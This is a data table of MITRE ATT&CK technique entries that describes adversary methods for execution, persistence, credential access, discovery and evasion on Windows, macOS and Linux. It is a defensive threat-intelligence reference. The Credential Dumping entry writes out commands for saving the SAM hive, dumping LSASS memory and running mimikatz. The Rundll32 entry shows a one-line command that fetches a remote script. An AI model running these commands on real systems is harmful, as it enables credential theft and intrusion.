ID	Name	Description	Tactics	Mitigation	Examples	URL
T1028	Windows Remote Management	Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell.	Execution, Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1028
T1009	Binary Padding	Some security tools inspect files with static signatures to determine if they are known malicious. Adversaries may add data to files to increase the size beyond what security tools are capable of handling or to change the file hash to avoid hash-based blacklists.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1009
T1008	Fallback Channels	Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1008
T1003	Credential Dumping	Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform\xa0Lateral Movement\xa0and access restricted information.\n\nSeveral of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\nSAM (Security Accounts Manager)\n\nThe SAM is a database file that contains local accounts for the host, typically those found with the \u2018net user\u2019 command.  To enumerate the SAM database, system level access is required.\n\xa0\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n* pwdumpx.exe \n* [[Software/S0008|gsecdump]]\n* [[Software/S0002|Mimikatz]]\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with [[Software/S0075|Reg]]:\n* reg save HKLM\sam sam\n* reg save HKLM\system system\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid 501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\nCached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable.  The number of default cached credentials varies, and this number can be altered per system.  This hash does not allow pass-the-hash style attacks.\n\xa0\nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n* pwdumpx.exe \n* [[Software/S0008|gsecdump]]\n* [[Software/S0002|Mimikatz]]\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using PBKDF2.\n\nLocal Security Authority (LSA) Secrets\n\nWith SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.\n\xa0\nWhen services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.\n\xa0\nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n* pwdumpx.exe \n* [[Software/S0008|gsecdump]]\n* [[Software/S0002|Mimikatz]]\n* secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted by his mechanism are\xa0UTF-16\xa0encoded, which means that they are returned in\xa0plaintext.\nWindows 10 adds protections for LSA Secrets described in Mitigation.\n\nNTDS from Domain Controller\n\nActive Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\NTDS\Ntds.dit of a domain controller.\n \nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\xa0\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\nGroup Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.\n\xa0\nThese group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line.\n\xa0\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\xa0\n* Metasploit\u2019s post exploitation module: "post/windows/gather/credentials/gpp"\n* Get-GPPPassword\n* gpprefdecrypt.py\n\xa0\nNotes:\nOn the SYSVOL share, the following can be used to enumerate potential XML files.\ndir /s *.xml\n\nService Principal Names (SPNs)\n\nSee [[Technique/T1208|Kerberoasting]].\n\nPlaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials are generated and stored in the\xa0Local Security Authority Subsystem Service\xa0(LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.\n\xa0\nSSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs):\xa0A Security Support Provider is a\xa0dynamic-link library\xa0(DLL) that makes one or more security packages available to applications.\n\nThe following SSPs can be used to access credentials:\n\xa0\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\nCredSSP: \xa0Provides SSO and\xa0Network Level Authentication\xa0for\xa0Remote Desktop Services.\n\xa0\nThe following tools can be used to enumerate credentials:\n\xa0\n* [[Software/S0005|Windows Credential Editor]]\n* [[Software/S0002|Mimikatz]]\n\xa0\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\xa0\nFor example, on the target host use procdump:\n* procdump -ma lsass.exe lsass_dump\n\xa0\nLocally, mimikatz can be run:\n* sekurlsa::Minidump\xa0lsassdump.dmp\n* sekurlsa::logonPasswords\n\nDCSync \n\nDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller\'s  application programming interface (API) to simulate the replication process from a remote domain controller.  Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data  from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [[Technique/T1097|Pass the Ticket]] or change an account\'s password as noted in [[Technique/T1098|Account Manipulation]]. DCSync functionality has been included in the "lsadump" module in Mimikatz. Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1003
T1002	Data Compressed	An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.	Exfiltration	[]	''	https://attack.mitre.org/wiki/Technique/T1002
T1001	Data Obfuscation	Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, commingling legitimate traffic with C2 communications traffic, or using a non-standard data encoding system, such as a modified Base64 encoding for the message body of an HTTP request.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1001
T1007	System Service Discovery	Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are "sc," "tasklist /svc" using [[Software/S0057|Tasklist]], and "net start" using [[Software/S0039|Net]], but adversaries may also use other tools as well.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1007
T1006	File System Logical Offsets	Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools.\n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1006
T1005	Data from Local System	Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to [[Exfiltration]].\n\nAdversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a [[Technique/T1059|Command-Line Interface]], such as [[Software/S0106|cmd]], which has functionality to interact with the file system to gather information. Some adversaries may also use [[Technique/T1119|Automated Collection]] on the local system.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1005
T1004	Winlogon Helper DLL	Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\Software\[Wow6432Node\]Microsoft\Windows NT\CurrentVersion\Winlogon\ and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are used to manage additional helper programs and functionalities that support Winlogon. \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:\n* Winlogon\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish [[Persistence]].	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1004
T1164	Re-opened Applications	Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at ~/Library/Preferences/com.apple.loginwindow.plist and ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist. \n\nAn adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1164
T1165	Startup Items	Per Apple\u2019s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items. This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, /Library/StartupItems isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism. Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1165
T1166	Setuid and Setgid	When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn\u2019t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an "s" instead of an "x" when viewing a file\'s attributes via ls -l. The chmod program can set these bits with via bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s [file].\n\nAn adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user\u2019s context.	Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1166
T1167	Securityd Memory	In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. Apple\u2019s securityd utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password.\n\nIf an adversary can obtain root access (allowing them to read securityd\u2019s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user\u2019s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1167
T1160	Launch Daemon	Per Apple\u2019s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in /System/Library/LaunchDaemons and /Library/LaunchDaemons. These LaunchDaemons have property list files which point to the executables that will be launched.\n \nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories. The daemon name may be disguised by using a name from a related operating system or benign software . Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root.\n \nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon\u2019s executable and gain persistence or Privilege Escalation.	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1160
T1161	LC_LOAD_DYLIB Addition	Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies. There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1161
T1162	Login Item	MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them. Users have direct control over login items installed using a shared file list which are also visible in System Preferences. These login items are stored in the user's ~/Library/Preferences/ directory in a plist file called com.apple.loginitems.plist. Some of these applications can open visible dialogs to the user, but they don\u2019t all have to since there is an option to \u2018Hide\u2019 the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1162
T1163	Rc.common	During the boot process, macOS executes source /etc/rc.common, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts. In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.\n\nAdversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1163
T1168	Local Job Scheduling	On Linux and Apple systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, at, and launchd. Unlike [[Technique/T1053|Scheduled Task]] on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).\n\ncron\n\nSystem-wide cron jobs are installed by modifying /etc/crontab file, /etc/cron.d/ directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. This works on Mac and Linux systems.\n\nThose methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for [[Persistence]], to conduct [[Execution]] as part of [[Lateral Movement]], to gain root privileges, or to run a process under the context of a specific account.\n\nat\n\nThe at program is another means on Linux-based systems, including Mac, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.\n\nlaunchd\n\nEach launchd job is described by a different configuration property list (plist) file similar to [[Technique/T1160|Launch Daemon]] or [[Technique/T1159|Launch Agent]], except there is an additional key called StartCalendarInterval with a dictionary of time values. This only works on macOS and OS X.	Persistence, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1168
T1169	Sudo	The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL. \n\nAdversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.	Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1169
T1083	File and Directory Discovery	Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. \n\nWindows\n\nExample utilities used to obtain this information are dir and tree. Custom tools may also be used to gather file and directory information and interact with the Windows API.\n\nMac and Linux\n\nIn Mac and Linux, this kind of discovery is accomplished with the ls, find, and locate commands.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1083
T1082	System Information Discovery	An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.\n\nWindows\n\nExample commands and utilities that obtain this information include ver, [[Software/S0096|Systeminfo]], and dir within [[Software/S0106|cmd]] for identifying information based on present files and directories.\n\nMac\n\nOn Mac, the systemsetup command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the system_profiler gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1082
T1081	Credentials in Files	Adversaries may search local file systems and remote file shares for files containing passwords.  These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [[Technique/T1003|Credential Dumping]]. Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1081
T1080	Taint Shared Content	Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [[Technique/T1023|Shortcut Modification]] of directory .LNK files that use [[Technique/T1036|Masquerading]] to look like the real directories, which are hidden through [[Technique/T1158|Hidden Files and Directories]]. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts.	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1080
T1087	Account Discovery	Adversaries may attempt to get a listing of local system or domain accounts. \n\nWindows\n\nExample commands that can acquire this information are net user, net group <groupname>, and net localgroup <groupname> using the [[Software/S0039|Net]] utility or through use of [[Software/S0105|dsquery]]. If adversaries attempt to identify the primary user, currently logged in user, or set of users that commonly uses a system, [[Technique/T1033|System Owner/User Discovery]] may apply.\n\nMac\n\nOn Mac, groups can be enumerated through the groups and id commands. In mac specifically, dscl . list /Groups and dscacheutil -q group can also be used to enumerate groups and users.\n\nLinux\n\nOn Linux, local users can be enumerated through the use of the /etc/passwd file which is world readable. In mac, this same file is only used in single-user mode in addition to the /etc/master.passwd file.\n\nAlso, groups can be enumerated through the groups and id commands. In mac specifically, dscl . list /Groups and dscacheutil -q group can also be used to enumerate groups and users.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1087
T1086	PowerShell	PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, and PSAttack.	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1086
T1085	Rundll32	The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute.\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"  This behavior has been seen used by malware such as Poweliks.	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1085
T1084	Windows Management Instrumentation Event Subscription	Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts. Examples of events that may be subscribed to are the wall clock time or the computer's uptime. Several threat groups have reportedly used this technique to maintain persistence.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1084
T1058	Service Registry Permissions Weakness	Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or [[Software/S0075|Reg]]. Access to Registry keys is controlled through Access Control Lists and permissions.\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as FailureCommand) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1058
T1089	Disabling Security Tools	Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1089
T1088	Bypass User Account Control	Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* eventvwr.exe can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some [[Lateral Movement]] techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity.	Defense Evasion, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1088
T1059	Command-Line Interface	Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. One example command-line interface on Windows systems is [[Software/S0106|cmd]], which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [[Technique/T1053|Scheduled Task]]).\n\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1059
T1018	Remote System Discovery	Adversaries will likely attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for [[Lateral Movement]] from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used. \n\nWindows\n\nExamples of tools and commands that acquire this information include "ping" or "net view" using [[Software/S0039|Net]].\n\nMac\n\nSpecific to Mac, the bonjour protocol to discover additional Mac-based systems within the same broadcast domain. Utilities such as "ping" and others can be used to gather information about remote systems.\n\nLinux\n\nUtilities such as "ping" and others can be used to gather information about remote systems.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1018
T1019	System Firmware	The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1019
T1145	Private Keys	Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.\n\nAdversaries may gather private keys from compromised systems for use in authenticating to [[Technique/T1021|Remote Services]] like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as ~/.ssh for SSH keys on *nix-based systems or C:\Users\(username)\.ssh\ on Windows.\n\nPrivate keys should require a password or passphrase for operation, so an adversary may also use [[Technique/T1056|Input Capture]] for keylogging or attempt to [[Technique/T1110|Brute Force]] the passphrase off-line.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1145
T1010	Application Window Discovery	Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.\n\nIn Mac, this can be done natively with a small [[Technique/T1155|AppleScript]] script.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1010
T1011	Exfiltration Over Other Network Medium	Exfiltration could occur over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel. Adversaries could choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.	Exfiltration	[]	''	https://attack.mitre.org/wiki/Technique/T1011
T1012	Query Registry	Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Some of the information may help adversaries to further their operation within a network.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1012
T1013	Port Monitors	A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup. This DLL can be located in C:\Windows\System32 and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors. The Registry key contains entries for the following:\n*Local Port\n*Standard TCP/IP Port\n*USB Monitor\n*WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1013
T1014	Rootkit	Rootkits are programs that hide the existence of malware by intercepting (i.e., [[Technique/T1179|Hooking]]) and modifying operating system API calls that supply system information. Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a [[Technique/T1062|Hypervisor]], Master Boot Record, or the [[Technique/T1019|System Firmware]].\n\nAdversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits have been seen for Windows, Linux, and Mac OS X systems.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1014
T1015	Accessibility Features	Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen.\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection (WFP/WRP). The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\Windows\System32\utilman.exe) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [[Technique/T1076|Remote Desktop Protocol]] will cause the replaced file to be executed with SYSTEM privileges.\n\nFor the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for the accessibility program (e.g., "utilman.exe"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the "debugger" program to be executed with SYSTEM privileges.\n\nOther accessibility features exist that may also be leveraged in a similar fashion:\n\n*On-Screen Keyboard: C:\Windows\System32\osk.exe\n*Magnifier: C:\Windows\System32\Magnify.exe\n*Narrator: C:\Windows\System32\Narrator.exe\n*Display Switcher: C:\Windows\System32\DisplaySwitch.exe\n*App Switcher: C:\Windows\System32\AtBroker.exe	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1015
T1016	System Network Configuration Discovery	Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [[Software/S0099|Arp]], [[Software/S0100|ipconfig]]/[[Software/S0101|ifconfig]], [[Software/S0102|nbtstat]], and [[Software/S0103|route]].	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1016
T1017	Application Deployment Software	Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.\n\nAccess to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1017
